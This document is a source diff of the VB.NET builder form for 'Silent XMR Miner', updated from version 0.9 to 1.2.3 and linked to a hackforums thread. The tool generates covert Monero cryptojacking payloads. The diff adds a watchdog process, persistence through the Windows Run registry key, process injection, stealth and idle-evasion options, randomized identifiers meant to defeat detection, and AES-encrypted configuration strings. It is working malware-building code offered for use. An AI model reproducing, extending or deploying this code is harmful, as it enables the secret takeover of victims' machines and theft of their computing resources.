@@ -1,31 +1,31 @@
-﻿Imports System.Security.Cryptography
+﻿Imports System.IO
+Imports System.Security.Cryptography
 Imports System.Text
 
 Public Class Form1
     Public Shared rand As New Random()
-    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public watchdogdata As Byte() = New Byte() {}
+    Public FA As New Advanced
+
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         Font = New Font(Font.Name, 8.25F * 100.0F / CreateGraphics().DpiY, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
+        FA.Font = New Font(Font.Name, 8.25F * 100.0F / CreateGraphics().DpiY, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
 
         CheckForIllegalCrossThreadCalls = False
         Codedom.F = Me
+        FA.F = Me
 
+
+        FA.txtAdvParam.Text = advancedParams
         BackgroundWorker1.RunWorkerAsync()
     End Sub
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 0.9"
-            txtMaxCPU.SelectedIndex = 4
-        Catch ex As Exception
-        End Try
-
-        Try
-            txtInstallPathMain.SelectedIndex = 0
-            txtInjection.SelectedIndex = 0
-            txtAdvParam.Text = advancedParams
+            MephForm1.Text = "Silent XMR Miner Builder 1.2.3"
         Catch ex As Exception
         End Try
 
@@ -43,13 +43,16 @@ Public Class Form1
     End Sub
 
     Public OutputPayload
-    Public Resources_dll = Randomi(rand.Next(5, 10))
-    Public Resources_xmr = Randomi(rand.Next(5, 10))
-    Public Resources_xmrig = Randomi(rand.Next(5, 10))
-    Public Resources_libs = Randomi(rand.Next(5, 10))
-    Public Resources_winring = Randomi(rand.Next(5, 10))
-    Public Resources_Parent = Randomi(rand.Next(5, 10))
-    Public AESKEY As String = Randomi(rand.Next(5, 10))
+    Public Resources_dll = Randomi(rand.Next(5, 40))
+    Public Resources_xmr = Randomi(rand.Next(5, 40))
+    Public Resources_xmrig = Randomi(rand.Next(5, 40))
+    Public Resources_libs = Randomi(rand.Next(5, 40))
+    Public Resources_watchdog = Randomi(rand.Next(5, 40))
+    Public Resources_winring = Randomi(rand.Next(5, 40))
+    Public Resources_Parent = Randomi(rand.Next(5, 40))
+    Public AESKEY As String = Randomi(256)
+    Public SALT As String = Randomi(32)
+    Public IV As String = Randomi(16)
 
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
@@ -80,24 +83,43 @@ Public Class Form1
         Try
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
             Dim InjectionTarget = txtInjection.Text.Split(" ")
-            Dim Source = My.Resources.Program
+            Dim MinerSource = My.Resources.Program
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
-            Dim builder As New StringBuilder(Source)
-            Dim argstr As String = " -B " & If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
-            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
+            Dim minerbuilder As New StringBuilder(MinerSource)
+            Dim argstr As String = " -B " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
 
-            builder.Replace("#dll", Resources_dll)
-            builder.Replace("#xmr", Resources_xmrig)
-            builder.Replace("#libs", Resources_libs)
-            builder.Replace("#winring", Resources_winring)
-            builder.Replace("#ParentRes", Resources_Parent)
-            builder.Replace("#STARTDELAY", txtStartDelay.Text)
-            builder.Replace("#KEY", AESKEY)
-            builder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
-            builder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
-            builder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
+            minerbuilder.Replace("#dll", Resources_dll)
+            minerbuilder.Replace("#xmr", Resources_xmrig)
+            minerbuilder.Replace("#libs", Resources_libs)
+            minerbuilder.Replace("#winring", Resources_winring)
+            minerbuilder.Replace("#watchdog", Resources_watchdog)
+            minerbuilder.Replace("#ParentRes", Resources_Parent)
+            minerbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
+            minerbuilder.Replace("#KEY", AESKEY)
+            minerbuilder.Replace("#SALT", SALT)
+            minerbuilder.Replace("#IV", IV)
+            minerbuilder.Replace("#LIBSPATH", EncryptString("Microsoft\Libs\"))
+            minerbuilder.Replace("#DLLSTR", EncryptString("Mandark.Mandark"))
+            minerbuilder.Replace("#DLLOAD", EncryptString("Load"))
+            minerbuilder.Replace("#REGKEY", EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
+            minerbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
+            minerbuilder.Replace("#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
+
+            minerbuilder.Replace("RInstall", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetTheResource", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetString", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RRun", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RBaseFolder", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RCheckProc", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RInitialize", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetGPU", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RAES_Decryptor", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RTruncate", Randomi(rand.Next(5, 40)))
+
+            If FA.toggleEnableDebug.Checked Then
+                minerbuilder.Replace("DefDebug", "true")
+            End If
 
             If toggleEnableIdle.Checked Then
                 argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
@@ -119,49 +141,91 @@ Public Class Form1
                 argstr += " --unam-stealth "
             End If
 
-            builder.Replace("#ARGSTR", EncryptString(argstr))
+            minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
 
             If toggleEnableGPU.Checked Then
-                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
-            End If
-
-            If toggleEnableHidden.Checked Then
-                builder.Replace("Public Shared IH As Boolean = False", "Public Shared IH As Boolean = True")
+                minerbuilder.Replace("DefGPU", "true")
+            Else
+                minerbuilder.Replace("DefGPU", "false")
             End If
 
             If chkInstall.Checked Then
                 txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
-                builder.Replace("#Const INS = False", "#Const INS = True")
-                builder.Replace("PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+                minerbuilder.Replace("DefInstall", "true")
+                minerbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+
+                If toggleWatchdog.Checked Then
+
+                    txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
+                    Dim watchdogpath = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe"
+
+                    minerbuilder.Replace("DefWatchdog", "true")
+
+                    Dim WatchdogSource = My.Resources.Watchdog
+                    Dim watchdogbuilder As New StringBuilder(WatchdogSource)
+
+                    watchdogbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
+                    watchdogbuilder.Replace("#KEY", AESKEY)
+                    watchdogbuilder.Replace("#SALT", SALT)
+                    watchdogbuilder.Replace("#IV", IV)
+                    watchdogbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
+                    watchdogbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+
+                    watchdogbuilder.Replace("RWDLoop", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RAES_Encryptor", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RAES_Decryptor", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RGetString", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RCheckProc", Randomi(rand.Next(5, 40)))
+
+                    WatchdogSource = watchdogbuilder.ToString()
+
+                    Codedom.WatchdogCompiler(watchdogpath, WatchdogSource)
+
+                    If Codedom.WatchdogOK Then
+                        txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
+                        If FA.toggleCustomWatchdog.Checked Then
+                            MessageBox.Show("Watchdog has been compiled and can be found in the same folder as the chosen miner path. Press OK after you're done with the Watchdog.")
+                        End If
+                        watchdogdata = File.ReadAllBytes(watchdogpath)
+                        File.Delete(watchdogpath)
+                    Else
+                        txtLog.Text = txtLog.Text + ("Error compiling Watchdog!" + vbNewLine)
+                    End If
+                Else
+                    minerbuilder.Replace("DefWatchdog", "true")
+                End If
+            Else
+                minerbuilder.Replace("DefInstall", "false")
             End If
 
             If chkAssembly.Checked Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
-                builder.Replace("#Const Assembly = False", "#Const Assembly = True")
+                minerbuilder.Replace("DefAssembly", "true")
 
-                builder.Replace("%Title%", txtTitle.Text)
-                builder.Replace("%Description%", txtDescription.Text)
-                builder.Replace("%Company%", txtCompany.Text)
-                builder.Replace("%Product%", txtProduct.Text)
-                builder.Replace("%Copyright%", txtCopyright.Text)
-                builder.Replace("%Trademark%", txtTrademark.Text)
-                builder.Replace("%v1%", num_Assembly1.Text)
-                builder.Replace("%v2%", num_Assembly2.Text)
-                builder.Replace("%v3%", num_Assembly3.Text)
-                builder.Replace("%v4%", num_Assembly4.Text)
-                builder.Replace("%Guid%", Guid.NewGuid.ToString)
-
+                minerbuilder.Replace("%Title%", txtTitle.Text)
+                minerbuilder.Replace("%Description%", txtDescription.Text)
+                minerbuilder.Replace("%Company%", txtCompany.Text)
+                minerbuilder.Replace("%Product%", txtProduct.Text)
+                minerbuilder.Replace("%Copyright%", txtCopyright.Text)
+                minerbuilder.Replace("%Trademark%", txtTrademark.Text)
+                minerbuilder.Replace("%v1%", num_Assembly1.Text)
+                minerbuilder.Replace("%v2%", num_Assembly2.Text)
+                minerbuilder.Replace("%v3%", num_Assembly3.Text)
+                minerbuilder.Replace("%v4%", num_Assembly4.Text)
+                minerbuilder.Replace("%Guid%", Guid.NewGuid.ToString)
+            Else
+                minerbuilder.Replace("DefAssembly", "false")
             End If
 
-            Source = builder.ToString
+            MinerSource = minerbuilder.ToString
 
             If chkIcon.Checked AndAlso txtIconPath.Text IsNot "" Then
-                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
+                Codedom.MinerCompiler(OutputPayload, MinerSource, Resources_Parent, txtIconPath.Text)
             Else
-                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
+                Codedom.MinerCompiler(OutputPayload, MinerSource, Resources_Parent, Nothing)
             End If
 
-            If Codedom.OK Then
+            If Codedom.MinerOK Then
 
                 txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
@@ -188,20 +252,20 @@ Public Class Form1
     End Sub
 
     Public Function AES_Encryptor(ByVal input As Byte()) As Byte()
-        Dim AES As New RijndaelManaged
-        Dim Hash_ As New MD5CryptoServiceProvider
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_.ComputeHash(Encoding.ASCII.GetBytes(AESKEY))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = CipherMode.ECB
-            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
-            Dim Buffer As Byte() = input
-            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
-        Catch ex As Exception
-        End Try
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(IV)
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(SALT)
+        Dim k1 As New Rfc2898DeriveBytes(AESKEY, saltValueBytes, 100)
+        Dim symmetricKey As New RijndaelManaged
+        symmetricKey.KeySize = 256
+        symmetricKey.Mode = CipherMode.CBC
+        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes)
+        Using mStream As New MemoryStream()
+            Using cStream As New CryptoStream(mStream, encryptor, CryptoStreamMode.Write)
+                cStream.Write(input, 0, input.Length)
+                cStream.Close()
+            End Using
+            Return mStream.ToArray()
+        End Using
     End Function
 
     Public Function EncryptString(ByVal input As String)
@@ -391,16 +455,6 @@ Public Class Form1
         Process.Start("https://hackforums.net/showthread.php?tid=5995773")
     End Sub
 
-    Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
-        If chkAdvanced.Checked Then
-            chkAdvanced.Text = "Enabled"
-            txtAdvParam.Enabled = True
-        Else
-            chkAdvanced.Text = "Disabled"
-            txtAdvParam.Enabled = False
-        End If
-    End Sub
-
     Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
         If toggleEnableIdle.Checked Then
             txtIdleCPU.Enabled = True
@@ -409,5 +463,9 @@ Public Class Form1
             txtIdleCPU.Enabled = False
             txtIdleWait.Enabled = False
         End If
+    End Sub
+
+    Private Sub MephButton1_Click(sender As Object, e As EventArgs) Handles MephButton1.Click
+        FA.Show()
     End Sub
 End Class
